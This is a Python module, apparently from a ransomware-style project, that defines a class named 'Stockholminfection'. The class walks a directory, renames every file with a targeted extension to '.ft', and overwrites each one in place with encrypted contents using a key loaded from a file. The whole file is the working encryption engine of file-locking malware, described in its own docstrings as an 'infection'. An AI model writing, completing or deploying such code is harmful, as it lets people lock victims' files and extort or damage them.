"""Library of functions to find and encrypt the wanted files"""

import os
from cipher_functions import encrypt
from cipher_functions import encrypt_message

class Stockholminfection:
    """Class in charge of create the infection"""
    def __init__(self, logger, path, extensions, key):
        self.logger = logger
        self.path = path
        self.extensions = extensions.split(",")
        self.key = key
        self._set_key()
        self.files = []

    def run(self):
        """run the engine of the infection"""
        self._search_and_rename_files()
        self.cipher_files()

    def cipher_files(self):
        """function that cipher files"""
        for file in self.files:
            with open(file, 'rb') as textfile:
                data_to_encrypt = textfile.read()
            with open(file, 'wb') as cipheredfile:
                cipheredfile.write(encrypt_message(data_to_encrypt, self.key))

    def _search_and_rename_files(self):
        for root, directories, files in os.walk(self.path):
            for file in files:
                if self._search_extension(file.split(".")[-1], self.extensions):
                    os.rename(root + '/' + file, root + '/' + file.split(".")[0] + ".ft")
                    self.files.append(root + '/' + file.split(".")[0] + ".ft")

    def _search_extension(self, extension, extensions_library = "ft"):
        if extension in extensions_library:
            return True
        return False

    def _set_key(self):
        with open(self.key, 'rb') as keyfile:
            key = keyfile.read()
        self.key = key
